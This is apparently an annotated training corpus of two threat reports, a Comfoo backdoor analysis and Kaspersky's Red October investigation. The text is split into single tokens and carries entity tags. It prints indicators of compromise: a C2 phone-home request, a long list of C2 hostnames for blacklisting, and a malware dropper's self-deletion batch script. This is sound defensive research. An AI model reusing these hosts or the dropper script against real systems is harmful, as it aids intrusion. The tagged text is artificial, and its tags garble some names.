.

Passive
monitoring
results

While
monitoring
Comfoo B_malware.backdoor
,
CTU
researchers
detected
more
than
200
variants
of
the
trojan
and
64
different
campaign
tags
used
by
the
threat
actors
to
organize
their
campaigns
.

Numerous
government
entities
and
private
companies
based
in
the
United
States
,
Europe
,
and
Asia
Pacific
had
Comfoo-infected
computers
phoning
home
to
the
Comfoo B_malware.backdoor
C2
infrastructure
(
see
Figure
5
)
.

Figure
5
.

Geographic
location
of
Comfoo B_malware.backdoor
victim
organizations
.

(
Source
:
Dell
SecureWorks
)

Much
of
the
traffic
emanated
from
multiple
Japanese
and
Indian
government
ministries
.

CTU
researchers
outlined
the
Japanese
attack
campaign
in
a
previous
analysis
entitled
Chasing
APT
.

The
following
industries
were
also
targeted
:
Education
Energy
Mineral
exploration
News
media
Semiconductors
Steel
manufacturing
Think
tanks
Telecommunications
Trade
organizations
Audio
and
videoconferencing
products

The
targeting
of
audio
and
videoconferencing
products
is
unusual
.

CTU
researchers
speculate
that
the
threat
actors
might
be
looking
for
intellectual
property
relating
to
audio
and
videoconferencing
.

Another
possibility
is
that
it
could
be
a
clever
and
stealthy
way
of
listening
and
watching
activities
of
both
commercial
and
government
organizations
.

Detecting
Comfoo B_malware.backdoor
in
the
enterprise

The
presence
of
Comfoo B_malware.backdoor
on
a
network
or
computer
can
be
detected
in
a
variety
of
ways
,
even
if
AV
engines
lack
detection
for
the
latest
variants
.

Analysts
can
search
for
known
Comfoo B_malware.backdoor
threat
indicators
in
network
traffic
,
on
hard
drives
,
in
memory
,
or
in
the
Windows
registry
.

Network
detection
A
typical
Comfoo B_malware.backdoor
HTTP
phone-home
request
looks
like
the
following
:
GET
/CWoNaJLBo/VTNeWw11212/12664/12VTNfNmM1aQ/UTWOqVQ132/
HTTP/1.1Accept
:
image/gif
,
image/x-xbitmap
,
image/jpeg
,
image/pjpeg
,
*/*Accept-Language
:
en-enUser-Agent
:
Mozilla/4.0
(
compatible
;
MSIE
6.0;Windows
NT
5.1)Host
:
smtp.dynamiclink.ddns.usConnection
:
Keep-AliveCache-Control
:
no-cache

An
active
C2
server
responds
with
headers
similar
to
the
following
:
HTTP/1.1
200
OKDate
:
Mon
,
29
Jul
2013
19:26:15
GMTServer
:
Apache/2.0.50
(
Unix
)
Content-Length
:
10Keep-Alive
:
timeout=15
,
max=90
Disk/memory/registry
detection

The
unique
string
T1Y943jIhk
can
be
found
in
the
Comfoo B_malware.backdoor
binary
.

Offline
forensic
analysis
may
be
required
to
search
for
this
string
if
a
rootkit
is
in
play
.

These
additional
strings
can
be
searched
but
are
not
guaranteed
to
be
unique
to
Comfoo B_malware.backdoor
:
CPUSpeed:%d.%dGHz
CPUNameString
:
%
s
CPUVendorIdentifier
:
%
s
CPUIdentifier
:
%
s
No
%
d
CPU
Information
:
SystemCurrent
Time
:
systemBoot
Time
:
IE
BHO
Name
:
%
s
11
.

IE
BHO
Information
!

10
.

IE
Version
Information
!

9
.

InstallApp
Information
!

8
.

NETBIOS
Information
!

7
.

Protocol
Information
!

6
.

NET
Information
!

5
.

Disk
Information
!

4
.

Account
Information
!

3
.

System
Time
!

2
.

CPU
Type
!

Can
not
get
this
information
,
error
code
is
%
d
.

Windows
Version
Information
!

Additionally
,
Comfoo B_malware.backdoor
uses
the
SetEvent
Windows
API
and
registers
an
event
that
frequently
contains
the
word
'
GAME
'
.

The
following
are
example
Comfoo B_malware.backdoor
event
names
:
exclusiveinstance12
THIS324NEWGAME
MYGAMEHAVESTART
MYGAMEHAVEstarted
MYGAMEHAVESTARTEd
MYGAMEHAVESTARTED
thisisanewfirstrun
THISISASUPERNEWGAMENOWBEGIN
thisisnewtrofor024
To
persist
without
adding
new
registry
entries
,
Comfoo B_malware.backdoor
edits
an
unused
system
service
configuration
,
replacing
the
DLL
path
and
setting
it
to
auto-start
on
boot
.

For
example
,
a
system
service
registry
key
entry
changed
by
Comfoo B_malware.backdoor
might
resemble
the
following
:
system\CurrentControlSet\Services\Netman\Parameters
Original
:
'ServiceDll
'
=
>
'
%
SystemRoot%\System32\netman.dll
'
Modified
:
'ServiceDll
'
=
>
'C:\WINDOWS\system32\tabcteng.dll
'
system\CurrentControlSet\Services\Netman
Original
:
'Start
'
=
>
'3
'
Modified
:
'Start
'
=
>
'2
'
Comfoo B_malware.backdoor
hijacks
service
settings
for
some
legitimate
service
DLLs
:
netman.dll
rasauto.dll
sens.dll

The
following
are
DLL
names
commonly
used
by
Comfoo B_malware.backdoor
:
cmmos.dll
jacpet.dll
javadb.dll
mszlobm.dll
netfram.dll
netman.dll
ntdapie.dll
ntdelu.dll
ntobm.dll
odbm.dll
senss.dll
suddec.dll
tabcteng.dll
vmmreg32.dll
wininete.dll

If
Comfoo B_malware.backdoor
successfully
connects
to
the
relay
server
and
receives
commands
from
the
master
console
,
then
it
creates
a
file
named
'
mstemp.temp
'
on
the
infected
system
to
store
the
output
of
the
last
shell
command
.

Conclusion

Comfoo B_malware.backdoor
is
the
tip
of
an
iceberg
.

The
CTU
research
team
notified
many
Comfoo B_malware.backdoor
victims
,
either
directly
or
through
the
computer
security
incident
response
teams
(
CSIRTs
)
in
their
respective
country
.

Analysis
was
also
shared
with
law
enforcement
.

Based
on
the
number
of
campaign
tags
observed
in
malware
samples
versus
those
seen
in
live
monitoring
by
the
CTU
research
team
,
there
are
likely
hundreds
more
unidentified
victims
.

Most
businesses
will
never
see
a
Comfoo B_malware.backdoor
infection
.

However
,
evaluating
whether
an
organization
is
a
potential
target
of
cyber-espionage
is
important
in
any
risk
evaluation
.

Chief
information
security
officers
should
maintain
awareness
of
any
reported
cyberespionage
threats
in
their
business
sector
.

If
one
player
in
an
industry
is
targeted
,
it
is
likely
all
major
players
(
or
newcomers
with
interesting
technology
)
in
that
industry
will
be
targets
at
some
point
.

Organizations
compromised
by
Comfoo B_malware.backdoor
(
or
most
types
of
APT
malware
)
likely
face
a
major
forensic
and
eradication
effort
.

This
effort
should
be
followed
by
a
major
investment
in
security
measures
to
keep
cyber-espionage
actors
out
of
the
network
.

Many
inhouse
security
teams
do
not
have
the
APT
expertise
to
respond
to
a
persistent
threat
that
requires
a
persistent
,
active
,
and
layered
defense
model
spanning
the
entire
attack
surface
of
an
organization
.

As
a
result
,
the
organization
might
need
outside
expertise
to
effectively
mitigate
these
types
of
threats
.

Appendix B_url.distribute
:
Comfoo B_malware.backdoor
hostnames
for
blacklisting
consideration

accounts.ddns.info B_url.unknown
active.googleupdate.hk B_url.unknown
active.nifty-user.com B_url.unknown
addr.googleupdate.hk B_url.unknown
ahn06.myfw.us B_url.unknown
allroot80.4pu.com B_url.unknown
apf.googleupdate.hk B_url.unknown
aptlkxqm.25u.com B_url.unknown
back.agfire.com B_url.unknown
back.winsupdate.com B_url.unknown
bbs.dynssl.com B_url.unknown
bbs.gladallinone.com B_url.unknown
bigdog.winself.com B_url.unknown
billgates.itsaol.com B_url.unknown
bjllgvtms.effers.com B_url.unknown
blizzcon.sexidude.com B_url.unknown
blizzcon.sexxxy.biz B_url.unknown
buffet80.bigmoney.biz B_url.unknown
buffet80.itsaol.com B_url.unknown
buffet.bbsindex.com B_url.unknown
bxpudqx.otzo.com B_url.unknown
my.amazingrm.com B_url.unknown
my.officebeautyclub.com B_url.unknown
myweb.wwwcrazy.com B_url.unknown
nevruz.mrface.com B_url.unknown
news.mcesign.com B_url.unknown
news.rumorse.com B_url.unknown
news.win.dnset.com B_url.unknown
news.wintersunshine.net B_url.unknown
night.mefound.com B_url.unknown
nikimen.etowns.net B_url.unknown
nslsa.microupdata.com B_url.unknown
nsser.systemsupdata.com B_url.unknown
nsservic.googleupdate.hk B_url.unknown
nunok.ninth.biz B_url.unknown
oct.clawsnare.com B_url.unknown
offer.eosboxster.com B_url.unknown
okkou.9966.org B_url.unknown
park006.myfw.us B_url.unknown
pazar.vicp.net B_url.unknown
pcnews.rr.nu B_url.unknown
pcpc.helpngr.net B_url.unknown
cart.itsaol.com B_url.unknown
catawarm.gicp.net B_url.unknown
cell.missingthegirl.com B_url.unknown
cmart.iownyour.org B_url.unknown
config.microupdata.com B_url.unknown
copyright.imwork.net B_url.unknown
cpt.csinfos.net B_url.unknown
crsky.systemsupdata.com B_url.unknown
database.googleupdate.hk B_url.unknown
davidcat.yick.lflink.com B_url.unknown
daviddog.gicp.net B_url.unknown
db.themmdance.com B_url.unknown
ddns.yourturbe.org B_url.unknown
deminich.gicp.net B_url.unknown
deminich.jungleheart.com B_url.unknown
demi.yick.lflink.com B_url.unknown
dgoil.3322.org B_url.unknown
dns.google-login.com B_url.unknown
do.centr-info.com B_url.unknown
dolaamen.xicp.net B_url.unknown
domain.centr-info.com B_url.unknown
domain.nifty-user.com B_url.unknown
download.yourturbe.org B_url.unknown
dunya.8800.org B_url.unknown
et.stoneqwer.com B_url.unknown
eudge.3322.org B_url.unknown
eudge.redirect.hm B_url.unknown
european.pass.as B_url.unknown
eurowizard.byinter.net B_url.unknown
facebook.nifty-japan.com B_url.unknown
fact.winsupdate.com B_url.unknown
fbook.google-login.com B_url.unknown
fish.windwarp.uicp.net B_url.unknown
football.deminich.jungleheart.com B_url.unknown
football.dynamiclink.ddns.us B_url.unknown
foxpart.oicp.net B_url.unknown
free3w.lflinkup.org B_url.unknown
fr.washbart.com B_url.unknown
ftp.alvinton.jetos.com B_url.unknown
ftp.lucky.ddns.ms B_url.unknown
ftpserver.3-a.net B_url.unknown
ftp.superaround.ns02.biz B_url.unknown
ftp.y3.3-a.net B_url.unknown
funew.noorno.com B_url.unknown
fun.marktie.com B_url.unknown
funnygamea.vicp.net B_url.unknown
games.jeepworker.com B_url.unknown
games.noorno.com B_url.unknown
googlemail.servehttp.com B_url.unknown
googleupdate2009.kmip.net B_url.unknown
graymmy.longmusic.com B_url.unknown
gws01.microupdata.com B_url.unknown
gws12.microupdata.com B_url.unknown
pcuser.ikwb.com B_url.unknown
podding.newsinsky.com B_url.unknown
poft.yahoo-user.com B_url.unknown
pofuyer.4pu.com B_url.unknown
polly.jwt.ourhobby.com B_url.unknown
polly.slyip.com B_url.unknown
poly.jwt.ourhobby.com B_url.unknown
pop3.freemail.mrface.com B_url.unknown
pop.microupdata.com B_url.unknown
pop.peroillion.com B_url.unknown
prc.deminich.jungleheart.com B_url.unknown
prc.dynamiclink.ddns.us B_url.unknown
pure.mypop3.org B_url.unknown
record.yick.lflink.com B_url.unknown
rember.clawsnare.com B_url.unknown
reserve.trickip.net B_url.unknown
rouji.king.proxydns.com B_url.unknown
s0ft.noorno.com B_url.unknown
sapudy.dns2.us B_url.unknown
server.epac.to B_url.unknown
server.nifty-login.com B_url.unknown
server.universityexp.com B_url.unknown
services.google-config.com B_url.unknown
shift.8866.org B_url.unknown
sinagame.2288.org B_url.unknown
singes.organiccrap.com B_url.unknown
singngh.gicp.net B_url.unknown
slll.pbfsnet.com B_url.unknown
smell.gotgeek.com B_url.unknown
smtp.deminich.jungleheart.com B_url.unknown
smtp.travelexpolorer.com B_url.unknown
soft.yahoo-user.com B_url.unknown
sollysly.servegame.com B_url.unknown
sonam.goodnews007.com B_url.unknown
sports.wintersunshine.net B_url.unknown
srv911.yahoo-user.com B_url.unknown
srv91.googleupdate.hk B_url.unknown
srv91.yahoo-user.com B_url.unknown
sscdtt.phmail.us B_url.unknown
stone.king.proxydns.com B_url.unknown
superaround.ns02.biz B_url.unknown
tech.bommow.com B_url.unknown
terrys.rr.nu B_url.unknown
test1.dns1.us B_url.unknown
test1.windwarp.uicp.net B_url.unknown
thec.csinfos.net B_url.unknown
timeout.myvnc.com B_url.unknown
trans.helpngr.net B_url.unknown
tttt.sundaynews.us B_url.unknown
tw.pudnet.net B_url.unknown
uncrisis.findhere.org B_url.unknown
update.yourturbe.org B_url.unknown
usstream.coyo.eu B_url.unknown
hanoihcm.phdns01.com B_url.unknown
havefuns.rkntils.10dig.net B_url.unknown
henryclub.25u.com B_url.unknown
hfwwpofuyer.4pu.com B_url.unknown
homehost.3322.org B_url.unknown
https.port25.biz B_url.unknown
hyphen.dyndns.biz B_url.unknown
hzg002.mooo.com B_url.unknown
image.google-login.com B_url.unknown
image.qpoe.com B_url.unknown
info.kembletech.com B_url.unknown
info.rumorse.com B_url.unknown
info.whandjg.net B_url.unknown
insert.51vip.biz B_url.unknown
office-sevice.com B_url.unknown
intrusion.post-horse.net B_url.unknown
it.buglan.com B_url.unknown
it.davyhop.com B_url.unknown
it.pudnet.net B_url.unknown
johnnees.rkntils.10dig.net B_url.unknown
kapa2000.3322.org B_url.unknown
kimomail.3-a.net B_url.unknown
korea001.tribeman.com B_url.unknown
korea1.mooo.com B_url.unknown
kx.davyhop.com B_url.unknown
lanama.jkub.com B_url.unknown
lcyma.jetos.com B_url.unknown
li.noorno.com B_url.unknown
livedoor.microupdata.com B_url.unknown
login.yahoo-user.com B_url.unknown
lovehill.3d-game.com B_url.unknown
lovehill.dyndns-blog.com B_url.unknown
lovehill.xxuz.com B_url.unknown
lsass.google-login.com B_url.unknown
luck201202.oicp.net B_url.unknown
mail911.nifty-login.com B_url.unknown
mail911.nifty-user.com B_url.unknown
mail91.nifty-login.com B_url.unknown
mail91.nifty-user.com B_url.unknown
mail.carsystm.net B_url.unknown
mail.lthreebox.com B_url.unknown
mail.mariofreegame.net B_url.unknown
mail.mgtfcayman.com B_url.unknown
mail.mofa.zyns.com B_url.unknown
mailsrv.mariofreegame.net B_url.unknown
mail.systemsupdata.com B_url.unknown
mail.xygong.com B_url.unknown
manpower.3322.org B_url.unknown
marhone.vicp.net B_url.unknown
mdb.clawsnare.com B_url.unknown
mf.tpznet.com B_url.unknown
microsoft.redirect.hm B_url.unknown
mil.winsupdate.com B_url.unknown
venus.gr8domain.biz B_url.unknown
vstar-2006.vicp.net B_url.unknown
wakawaka.servehttp.com B_url.unknown
webdata.helpngr.net B_url.unknown
web.nifty-login.com B_url.unknown
web.nifty-user.com B_url.unknown
web.yahoo-user.com B_url.unknown
wetboy.vicp.hk B_url.unknown
winhelp.yahoo-config.com B_url.unknown
winserver.3-a.net B_url.unknown
wogawoga.sytes.net B_url.unknown
worldwide.servehttp.com B_url.unknown
wt.pudnet.net B_url.unknown
wwmrus.gicp.net B_url.unknown
www12.sexidude.com B_url.unknown
www.a1yac.net B_url.unknown
www.avau.info B_url.unknown
www.ayfd.info B_url.unknown
www.butr.info B_url.unknown
www.catholicstory.info B_url.unknown
www.config.sendsmtp.com B_url.unknown
www.drsc.in B_url.unknown
www.firehorse.changeip.name B_url.unknown
www.fsdr.info B_url.unknown
www.google-login.com B_url.unknown
www.greenhawthorn.com B_url.unknown
www.grtk.info B_url.unknown
www.hgtw.info B_url.unknown
www.jeepworker.com B_url.unknown
www.kkle.info B_url.unknown
www.lconstruct.com B_url.unknown
www.linejudge.net B_url.unknown
www.microsoft.yourtrap.com B_url.unknown
www.missingthegirl.com B_url.unknown
www.nifty-japan.com B_url.unknown
www.noorno.com B_url.unknown
www.post-horse.net B_url.unknown
www.search.wwwhost.biz B_url.unknown
www.setinfor.proxydns.com B_url.unknown
www.smtp2010.googleupdate.hk B_url.unknown
www.solarisc.com B_url.unknown
www.superpowereye.com B_url.unknown
www.swf.zyns.com B_url.unknown
www.test1.dns1.us B_url.unknown
www.tomdavid.dns04.com B_url.unknown
www.windows.dynamicdns.org.uk B_url.unknown
www.wsdv.info B_url.unknown
xmahone.51vip.biz B_url.unknown
xmahone.gicp.net B_url.unknown
xmahone.suroot.com B_url.unknown
yftpost.flnet.org B_url.unknown
ynet.nifty-login.com B_url.unknown
ynet.nifty-user.com B_url.unknown
msnsupport.servehttp.com B_url.unknown
zp.amazingrm.com B_url.unknown
zp.tpznet.com B_url.unknown
'
Red B_malware.infosteal
October I
'
Diplomatic
Cyber
Attacks
Investigation
Contents
Executive
Summary
Anatomy
of
the
attack
General
description
Step-by-step
description
(
1st
stage
)
Step-by-step
description
(
2nd
stage
)
Timeline
Targets
KSN
statistics
Sinkhole
statistics
KSN
+
sinkhole
data
С&C
information
Executive
Summary
In
October
2012
,
Kaspersky
Lab
's
Global
Research
&
Analysis
Team
initiated
a
new
threat
research
after
a
series
of
attacks
against
computer
networks
of
various
international
diplomatic
service
agencies
.

A
large
scale
cyber-espionage
network
was
revealed
and
analyzed
during
the
investigation
,
which
we
called
'
Red B_malware.infosteal
October I
'
(
after
famous
novel
'The
Hunt
For
The
Red B_malware.infosteal
October I
'
)
.

This
report
is
based
on
detailed
technical
analysis
of
a
series
of
targeted
attacks
against
diplomatic
,
governmental
and
scientific
research
organizations
in
different
countries
,
mostly
related
to
the
region
of
Eastern
Europe
,
former
USSR
members
and
countries
in
Central
Asia
.

The
main
objective
of
the
attackers
was
to
gather
intelligence
from
the
compromised
organizations
,
which
included
computer
systems
,
personal
mobile
devices
and
network
equipment
.

The
earliest
evidence
indicates
that
the
cyber
-
espionage
campaign
was
active
since
2007
and
is
still
active
at
the
time
of
writing
(
January
2013
)
.

Besides
that
,
registration
data
used
for
the
purchase
of
several
Command
&
Control
(
C&C
)
servers
and
unique
malware
filenames
related
to
the
current
attackers
hints
at
even
earlier
time
of
activity
dating
back
to
May
2007
.

Main
Findings
Advanced
Cyber
-
espionage
Network
:
The
attackers
have
been
active
for
at
least
several
years
,
focusing
on
diplomatic
and
governmental
agencies
of
various
countries
across
the
world
.

Information
harvested
from
infected
networks
was
reused
in
later
attacks
.

For
example
,
stolen
credentials
were
compiled
in
a
list
and
used
when
the
attackers
needed
to
guess
secret
phrase
in
other
locations
.

To
control
the
network
of
infected
machines
,
the
attackers
created
more
than
60
domain
names
and
several
server
hosting
locations
in
different
countries
(
mainly
Germany
and
Russia
)
.

The
C&C
infrastructure
is
actually
a
chain
of
servers
working
as
proxies
and
hiding
the
location
of
the
'mothership
'
control
server
.

Unique
architecture
:
The
attackers
created
a
multi-functional
kit
which
has
a
capability
of
quick
extension
of
the
features
that
gather
intelligence
.

The
system
is
resistant
to
C
&
C
server
takeover
and
allows
the
attack
to
recover
access
to
infected
machines
using
alternative
communication
channels
.

Broad
variety
of
targets
:
Beside
traditional
attack
targets
(
workstations
)
,
the
system
is
capable
of
stealing
data
from
mobile
devices
,
such
as
smartphones
(
iPhone
,
Nokia
,
Windows
Mobile
)
,
enterprise
network
equipment
(
Cisco
)
,
removable
disk
drives
(
including
already
deleted
files
via
a
custom
file
recovery
procedure
)
.

Importation
of
exploits
:
The
samples
we
managed
to
find
were
using
exploit
code
for
vulnerabilities
in
Microsoft
Word
and
Microsoft
Excel
that
were
created
by
other
attackers
and
employed
during
different
cyber
attacks
.

The
attackers
left
the
imported
exploit
code
untouched
,
perhaps
to
harden
the
identification
process
.

Attacker
identification
:
Basing
on
registration
data
of
C&C
servers
and
numerous
artifacts
left
in
executables
of
the
malware
,
we
strongly
believe
that
the
attackers
have
Russian-speaking
origins
.

Current
attackers
and
executables
developed
by
them
have
been
unknown
until
recently
,
they
have
never
related
to
any
other
targeted
cyberattacks
.

Anatomy
of
the
attack
General
description
These
attacks
comprised
of
the
classical
scenario
of
specific
targeted
attacks
,
consisting
of
two
major
stages
:
1
.

Initial
infection
2
.

Additional
modules
deployed
for
intelligence
gathering
The
malicious
code
was
delivered
via
e-mail
as
attachments
(
Microsoft
Excel
,
Word
and
,
probably
PDF
documents
)
which
were
rigged
with
exploit
code
for
known
security
vulnerabilities
in
the
mentioned
applications
.

In
addition
to
Office
documents
(
CVE-2009-3129
,
CVE-2010-3333
,
CVE-2012-0158
)
,
it
appears
that
the
attackers
also
infiltrated
victim
network
(
s
)
via
Java
exploitation
(
known
as
the
'
Rhino
'
exploit
(
CVE-2011-3544
)
.

Right
after
the
victim
opened
the
malicious
document
or
visit
malicious
URL
on
a
vulnerable
system
,
the
embedded
malicious
code
initiated
the
setup
of
the
main
component
which
in
turn
handled
further
communication
with
the
C&C
servers
.

Next
,
the
system
receives
a
number
of
additional
spy
modules
from
the
C&C
server
,
including
modules
to
handle
infection
of
smartphones
.

The
main
purpose
of
the
spying
modules
is
to
steal
information
.

This
includes
files
from
different
cryptographic
systems
,
such
as
'Acid
Cryptofiler
'
,
(
see
https://fr.wikipedia.org/wiki/Acid_Cryptofiler B_url.normal
)
which
is
known
to
be
used
in
organizations
of
European
Union/European
Parliament
/
European
Commission
since
the
summer
of
2011
.

All
gathered
information
is
packed
,
encrypted
and
only
then
transferred
to
the
C&C
server
.

Step-by-step
description
(
1st
stage
)
During
our
investigation
we
could
n't
find
any
e-mails
used
in
the
attacks
,
only
top
level
dropper
documents
.

Nevertheless
,
based
on
indirect
evidence
,
we
know
that
the
e-mails
can
be
sent
using
one
of
the
following
methods
:
Using
an
anonymous
mailbox
from
a
free
public
email
service
provider
Using
mailboxes
from
already
infected
organizations
E-mail
subject
lines
as
well
as
the
text
in
e-mail
bodies
varied
depending
on
the
target
(
recipient
)
.

The
attached
file
contained
the
exploit
code
which
activated
a
Trojan
dropper
in
the
system
.

We
have
observed
the
use
of
at
least
three
different
exploits
for
previously
known
vulnerabilities
:
CVE-2009-3129
(
MS
Excel
)
,
CVE-2010-3333
(
MS
Word
)
and
CVE-2012-0158
(
MS
Word
)
.

The
first
attacks
that
used
the
exploit
for
MS
Excel
started
in
2010
,
while
attacks
targeting
the
MS
Word
vulnerabilities
appeared
in
the
summer
of
2012
.

As
a
notable
fact
,
the
attackers
used
exploit
code
that
was
made
public
and
originally
came
from
a
previously
known
targeted
attack
campaign
with
Chinese
origins
.

The
only
thing
that
was
changed
is
the
executable
which
was
embedded
in
the
document
;
the
attackers
replaced
it
with
their
own
code
.

The
embedded
executable
is
a
file
-
dropper
,
which
extracts
and
runs
three
additional
files
.

%
TEMP%MSC.BAT
%
ProgramFiles
%
WINDOWS
NTLHAFD.GCP
(
<
-
This
file
name
varies
)
%
ProgramFiles
%
WINDOWS
NTSVCHOST.EXE
MSC.BAT
file
has
the
following
contents
:
chcp
1251
:
Repeat
attrib
-a
-s
-h
-r
'
%
DROPPER_FILE
%
'
del
'
%
DROPPER_FILE
%
'
if
exist
'
%
DROPPER_FILE
%
'
goto
Repeat
del
'
%
TEMP%msc.bat
'
Another
noteworthy
fact
is
in
the
first
line
of
this
file
,
which
is
a
command
to
switch
the
codepage
of
an
infected
system
to
1251
.

This
is
required
to
address
files
and
directories
that
contain
Cyrillic
characters
in
their
names
.

The
'LHAFD.GCP
'
file
is
encrypted
with
RC4
and
compressed
with
the
'Zlib
'
library
.

This
file
is
essentially
a
backdoor
,
which
is
decoded
by
the
loader
module
(
svchost.exe
)
.

The
decrypted
file
is
injected
into
system
memory
and
is
responsible
for
communication
with
the
C&C
server
.

On
any
infected
system
,
every
major
task
is
performed
by
the
main
backdoor
component
.

The
main
component
is
started
only
after
its
loader
(
'
svchost.exe
'
)
checks
if
the
internet
connection
is
available
.

It
does
so
by
connecting
to
three
Microsoft
hosts
:
update.microsoft.com B_url.normal
www.microsoft.com B_url.normal
support.microsoft.com B_url.normal

Figure
-
Hosts
used
to
validate
internet
connection

After
the
Internet
connection
is
validated
,
the
loader
executes
the
main
backdoor
component
that
connects
to
its
C&C
servers
:
Capture
of
malware
's
communication
with
the
C2
The
connections
with
the
C&C
are
encrypted
-
different
encryption
algorithms
are
used
to
send
and
receive
data
.

Encrypted
communication
with
the
C2
During
our
investigation
,
we
found
more
than
60
different
command-and-control
domains
.

Each
malware
sample
contains
three
such
domains
,
which
are
hardcoded
inside
the
main
backdoor
component
:
Hardcoded
C2
domains
inside
backdoor
Step-by-step
description
(
2nd
stage
)
After
a
connection
with
the
C
&
C
server
is
established
,
the
backdoor
starts
the
communication
process
,
which
leads
to
the
loading
of
additional
modules
.

These
modules
can
be
split
into
two
categories
:
'
offline
'
and
'
nline
'
.

The
main
difference
between
these
categories
is
their
behavior
on
the
infected
system
:
'
Offline
'
:
exists
as
files
on
local
disk
,
capable
of
creating
its
own
system
registry
keys
,
local
disk
log
files
,
and
may
communicate
with
C&C
servers
on
their
own
.

'
Online
'
:
exists
only
in
system
memory
and
is
never
saved
to
local
disk
,
do
not
create
registry
keys
,
all
logs
are
also
kept
in
memory
instead
of
local
disk
and
sends
the
result
of
work
to
the
C&C
server
using
own
code
.

There
is
a
notable
module
among
all
others
,
which
is
essentially
created
to
be
embedded
into
Adobe
Reader
and
Microsoft
Office
applications
.

The
main
purpose
of
its
code
is
to
create
a
foolproof
way
to
regain
access
to
the
target
system
.

The
module
expects
a
specially
crafted
document
with
attached
executable
code
and
special
tags
.

The
document
may
be
sent
to
the
victim
via
e-mail
.

It
will
not
have
an
exploit
code
and
will
safely
pass
all
security
checks
.

However
,
like
with
exploit
case
,
the
document
will
be
instantly
processed
by
the
module
and
the
module
will
start
a
malicious
application
attached
to
the
document
.

This
trick
can
be
used
to
regain
access
to
the
infected
machines
in
case
of
unexpected
C&C
servers
shutdown
/
takeover
.

Timeline
We
have
identified
over
1000
different
malicious
files
related
to
over
30
modules
of
this
Trojan
kit
.

Most
of
them
were
created
between
May
2010
and
October
2012
.

There
were
115
file-creation
dates
identified
which
are
related
to
these
campaigns
via
emails
during
the
last
two
and
a
half
years
.

Concentration
of
file
creation
dates
around
a
particular
day
may
indicate
date
of
the
massive
attacks
(
which
was
also
confirmed
by
some
of
our
side
observations
)
:
Year
2010
19.05.2010
21.07.2010
04.09.2010
Year
2011
05.01.2011
14.03.2011
05.04.2011
23.06.2011
06.09.2011
21.09.2011
Year
2012
12.01.2012
Below
is
a
list
of
sample
attachment
filenames
that
were
sent
to
some
of
the
victims
:
File
name
:
Katyn_-_opinia_Rosjan.xls
FIEO
contacts
update.xls
spisok
sotrudnikov.xls
List
of
shahids.xls
Spravochnik.xls
Telephone.xls
BMAC
Attache
List
-
At
11
Oct_v1[1].XLS
MERCOSUR_Imports.xls
Cópia
de
guia
de
telefonos
(
2).xls
Programme
de
fetes
2011.xls
12
05
2011
updated.xls
telefonebi.xls
Targets
We
used
two
approaches
to
identify
targets
for
these
attacks
.

First
,
we
used
the
Kaspersky
Security
Network
(
KSN
)
and
then
we
set
up
our
own
sinkhole
server
.

The
data
received
using
two
independent
ways
was
correlating
and
this
confirmed
objective
findings
.

KSN
statistics
The
attackers
used
already
detected
exploit
codes
and
because
of
this
,
in
the
beginning
of
the
research
we
already
had
some
statistics
of
detections
with
our
anti-malware
software
.

We
searched
for
similar
detections
for
the
period
of
2011-2012
.

That
is
how
we
discovered
more
than
300
unique
systems
,
which
had
detected
at
least
one
module
of
this
Trojan
kit
.

RUSSIAN
FEDERATION
KAZAKHSTAN
AZERBAIJAN
BELGIUM
INDIA
AFGHANISTAN
ARMENIA
IRAN
TURKMENISTAN
UKRAINE
UNITED
STATES
VIET
NAM
BELARUS
GREECE
ITALY
MOROCCO
PAKISTAN
SWITZERLAND
UGANDA
UNITED
ARAB
EMIRATES
BRAZIL
FRANCE
GEORGIA
GERMANY
JORDAN
MOLDOVA
SOUTH
AFRICA
TAJIKISTAN
TURKEY
UZBEKISTAN
AUSTRIA
CYPRUS
KYRGYZSTAN
LEBANON
MALAYSIA
QATAR
SAUDI
ARABIA
35
21
15
15
15
10
10
776665555555544444444443333333
CONGO
INDONESIA
KENYA
LITHUANIA
OMAN
TANZANIA
222222
Countries
with
more
than
one
infections
Once
again
,
this
is
based
on
data
from
Kaspersky
AV
products
.

Apparently
,
real
number
and
list
of
victim
names
is
much
larger
than
mentioned
above
.

Sinkhole
statistics
During
our
analysis
,
we
uncovered
more
than
60
different
domains
used
by
different
variants
of
the
malware
.

Out
of
the
list
of
domains
,
several
were
expired
so
we
registered
them
to
evaluate
the
number
of
victims
connecting
to
them
.

The
following
domains
have
been
registered
and
sinkholed
by
Kaspersky
Lab
:
Domain
shellupdate.com B_url.distribute
msgenuine.net B_url.distribute
microsoft-msdn.com B_url.distribute
windowsonlineupdate.com B_url.distribute
dll-host-update.com B_url.distribute
windows-genuine.com B_url.distribute
Date
sinkholed
5-Dec-2012
19-Nov-2012
5-Nov-2012
2-Nov-2012
All
the
sinkholed
domains
currently
point
to
'
95.211.172.143 B_ip.distribute
'
,
which
is
Kasperskys
'
sinkhole
server
.

During
the
monitoring
period
(
2-
Nov
2012
-
10
Jan
2013
)
,
we
registered
over
55,000
connections
to
the
sinkhole
.

The
most
popular
domain
is
'dll-host-update.com
'
,
which
is
receiving
most
of
the
traffic
.

From
the
point
of
view
of
country
distribution
of
connections
to
the
sinkhole
,
we
have
observed
victims
in
39
countries
,
with
most
of
IPs
being
from
Switzerland
.

Kazakhstan
and
Greece
follow
next
.

Interestingly
,
when
connecting
to
the
sinkhole
,
the
backdoors
submit
their
unique
victim
ID
,
which
allows
us
to
separate
the
multiple
IPs
per
victims
.

Based
on
the
traffic
received
to
our
sinkhole
,
we
created
the
following
list
of
unique
victim
IDs
,
countries
and
possible
profiles
:
Victim
ID
0706010C1BC0B9E5B702
0F746C2F283E2FACE581
150BD7E7449C42C66ED1
15B7400DBC4975BFAEF6
Country
Kazakhstan
Kazakhstan
Kazakhstan
Austria
Victim
profile
Gov
research
institute
?

?

?

24157B5D2CD0CA8AA602
UAE
3619E36303A2A56DC880
Russia
4624C55DEF872FBF2A93
Spain
4B5181583F843A904568
Spain
4BB2783B8AEC0B439CE8
Switzerland
5392032B24AAEE8F3333
Kazakhstan
569530675E86118895C4
Pakistan
57FE04BA107DD56D2820
Iran
5D4102CD1D87417FF93B
Russia
5E65486EF8CC4EE4DB5B
Japan
6127D685ED1E72E09201
Kazakhstan
6B9AFF89A02958C79C17
Ireland
6D97B24C08DD64EEDE03
Czech
Republic
7B14DE85C80368337E87
Turkey
89BF96469244534DC092
Belarus
8AA071A22BEDD8D8EC13
Moldova
8C58407030570D3A3F52
Albania
Bosnia
and
Herzegovina
947827A169348FB01E2F
Switzerland
B34C94D561B348EAC75D
B49FC93701E7B7F83C44
Belgium
